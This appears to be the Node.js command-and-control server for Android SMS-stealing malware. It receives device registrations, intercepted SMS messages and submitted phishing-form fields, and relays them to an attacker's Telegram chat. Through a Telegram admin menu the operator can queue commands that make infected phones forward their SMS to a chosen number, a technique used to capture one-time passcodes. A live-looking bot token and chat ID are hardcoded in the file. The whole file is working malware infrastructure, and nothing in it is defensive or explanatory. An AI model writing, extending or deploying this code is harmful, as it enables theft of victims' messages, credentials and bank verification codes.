const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
// ===== CONFIG =====
const BOT_TOKEN = '8325992828:AAFhVrtzLAsSn_ZpdAHwWnIOwr6dXw6G0Ns';
const ADMIN_IDS = [-1002572660367];   // <- yahan naya chat id
const DEVELOPER = '@heck0bot';
const PORT = 3000;

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname, 'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});

// ===== EXPRESS APP =====
const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ===== TELEGRAM BOT (Polling) =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===== RUNTIME DATA =====
const devices = new Map();
const sessions = {};
const notifiedDevices = new Set();

// ===== UTILS =====
function readQueue() { return fs.readJsonSync(QUEUE_FILE, { throws: false }) || {}; }
function writeQueue(q) { fs.writeJsonSync(QUEUE_FILE, q, { spaces: 2 }); }
function addCommand(uuid, cmd) {
  const q = readQueue();
  q[uuid] = q[uuid] || [];
  q[uuid].push(cmd);
  writeQueue(q);
}
function formatDevice(d) {
  const online = (Date.now() - (d.lastSeen || 0) < 60000);
  return `📱 *${d.model || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'}\n🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 Battery: ${d.battery || 'N/A'}%\n🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
}
function isAdmin(chatId) { return ADMIN_IDS.includes(chatId); }

// ===== ROUTES =====
app.get('/', (_, res) => res.send('✅ Panel online'));

// Device connect
app.post('/connect', (req, res) => {
  console.log('Received connect request body:', req.body);
  const { uuid, model, battery, sim1, sim2 } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });

  if (!notifiedDevices.has(uuid)) {
    const payload = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}\n\n👨💻 Developer: ${DEVELOPER}`;
    ADMIN_IDS.forEach(id => bot.sendMessage(id, payload, { parse_mode: 'Markdown' }).catch(() => { }));
    notifiedDevices.add(uuid);
  }

  res.sendStatus(200);
});

// Commands poll
app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('missing uuid');
  const q = readQueue();
  const cmds = q[uuid] || [];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

// SMS route
app.post('/sms', (req, res) => {
  const { uuid, from, body, sim, timestamp, battery } = req.body;
  if (!uuid || !from || !body) return res.status(400).send('missing fields');

  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
  const ts = new Date(timestamp || Date.now());

  const smsMsg = `📩 *New SMS*\n📱 Device: ${device.model}\n🔋 Battery: ${battery || 'N/A'}%\nFrom: ${from}\nSIM1: ${device.sim1}\nSIM2: ${device.sim2}\nBody: ${body}\nMessSIM: ${sim}\nTime: ${ts.toLocaleDateString()} ${ts.toLocaleTimeString()}\n\n👨💻 Developer: ${DEVELOPER}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMsg, { parse_mode: 'Markdown' }).catch(() => { }));

  const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
  const list = fs.existsSync(smsFile) ? fs.readJsonSync(smsFile) : [];
  list.unshift({ from, body, sim, battery, timestamp: ts.getTime() });
  fs.writeJsonSync(smsFile, list.slice(0, 500), { spaces: 2 });

  res.sendStatus(200);
});

// HTML form submit
app.post('/html-form-data', (req, res) => {
  const { uuid, ...fields } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  const fp = path.join(STORAGE_DIR, `${uuid}.json`);
  fs.writeJsonSync(fp, fields, { spaces: 2 });

  const device = devices.get(uuid) || { model: uuid, brand: 'Unknown', battery: 'N/A' };
  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n🏷 Brand: ${device.brand}\n🔋 Battery: ${device.battery || 'N/A'}%\n`;

  for (let [k, v] of Object.entries(fields)) {
    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
    msg += `🔸 *${label}*: ${v}\n`;
  }

  msg += `\n👨💻 Developer: ${DEVELOPER}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => { }));

  res.sendStatus(200);
});

// ===== TELEGRAM BOT COMMANDS =====
bot.on('message', msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, '❌ Permission denied.');
    return;
  }

  if (sessions[chatId] && sessions[chatId].stage) {
    const s = sessions[chatId];
    if (s.action === 'sms_forward_on') {
      const forwardTo = text;
      addCommand(s.uuid, { type: 'sms_forward', action: 'on', sim: s.sim, number: forwardTo });
      bot.sendMessage(chatId, `✅ SMS Forward ON SIM${s.sim} → ${forwardTo}\n👨💻 Developer: ${DEVELOPER}`);
      delete sessions[chatId];
      return;
    }
  }

  if (text === '/start') {
    bot.sendMessage(chatId, '✅ Admin Panel Ready', { reply_markup: { keyboard: [['Connected devices'], ['SMS Forward']], resize_keyboard: true } });
  }
  if (text === 'Connected devices') {
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    let out = ''; for (let [u, d] of devices.entries()) out += `${formatDevice(d)}\nUUID: \`${u}\`\n\n`;
    bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
  }
  if (text === 'SMS Forward') {
    const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model || uuid, callback_data: `sms_device:${uuid}` }]);
    if (rows.length === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    bot.sendMessage(chatId, '📨 Select device for SMS Forward:', { reply_markup: { inline_keyboard: rows } });
  }
});

// ===== INLINE CALLBACKS =====
bot.on('callback_query', async cb => {
  const chatId = cb.message.chat.id;
  const data = cb.data;
  if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, { text: '❌ Not allowed' });

  const [cmd, uuid] = data.split(':');
  const device = devices.get(uuid);

  switch (cmd) {
    case 'sms_device': {
      const buttons = [
        [{ text: '📨 SMS Forward', callback_data: `sms_forward_menu:${uuid}` }],
        [{ text: '⬅️ Back', callback_data: 'back_devices' }]
      ];
      return bot.editMessageText(`📨 SMS Commands for ${device.model || uuid}\n👨💻 Developer: ${DEVELOPER}`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: buttons }
      });
    }
    case 'sms_forward_menu': {
      const row = [{ text: 'SIM1', callback_data: `sms_forward_sim1:${uuid}` }, { text: 'SIM2', callback_data: `sms_forward_sim2:${uuid}` }];
      return bot.editMessageText('📨 Choose SIM for SMS Forward:', {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [row, [{ text: '⬅️ Back', callback_data: `sms_device:${uuid}` }]] }
      });
    }
    case 'sms_forward_sim1':
    case 'sms_forward_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      const on = { text: 'Enable', callback_data: `sms_forward_on_sim${sim}:${uuid}` };
      const off = { text: 'Disable', callback_data: `sms_forward_off_sim${sim}:${uuid}` };
      return bot.editMessageText(`SMS Forward SIM${sim}:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[on, off], [{ text: '⬅️ Back', callback_data: `sms_forward_menu:${uuid}` }]] }
      });
    }
    case 'sms_forward_on_sim1':
    case 'sms_forward_on_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      sessions[chatId] = { stage: 'await_number', action: 'sms_forward_on', sim, uuid };
      bot.sendMessage(chatId, `📨 Enter number to forward SMS TO (SIM${sim}):`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'sms_forward_off_sim1':
    case 'sms_forward_off_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      addCommand(uuid, { type: 'sms_forward', action: 'off', sim });
      bot.sendMessage(chatId, `✅ SMS Forward OFF SIM${sim}\n👨💻 Developer: ${DEVELOPER}`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'back_devices': {
      const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model || uuid, callback_data: `sms_device:${uuid}` }]);
      bot.editMessageText('📨 Select device for SMS Forward:', {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: rows }
      });
      return bot.answerCallbackQuery(cb.id);
    }
    default:
      return bot.answerCallbackQuery(cb.id, { text: '❌ Unknown action' });
  }
});

// ===== START SERVER =====
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));

// ===== BOT STARTUP CHECK =====
bot.getMe()
  .then(info => console.log(`🤖 Bot started as @${info.username}`))
  .catch(err => console.error('❌ Bot token invalid:', err.message));
